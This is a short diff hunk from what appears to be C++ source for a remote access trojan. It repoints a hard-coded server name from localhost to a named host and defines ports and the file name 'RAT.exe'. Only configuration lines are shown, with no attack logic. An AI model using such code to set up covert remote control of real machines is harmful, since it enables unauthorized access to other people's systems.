@@ -31,7 +31,7 @@ using namespace std;
 
 //Define for port and host arguments
 #define HARD_CODED_ARGS
-#define SERVER_NAME "127.0.0.1" //Can be Name or IP address
+#define SERVER_NAME "P2-4130-31" //Can be Name or IP address
 #define MY_PORT 2020
 #define RAT_PORT 2030
 #define FILE_NAME "RAT.exe"
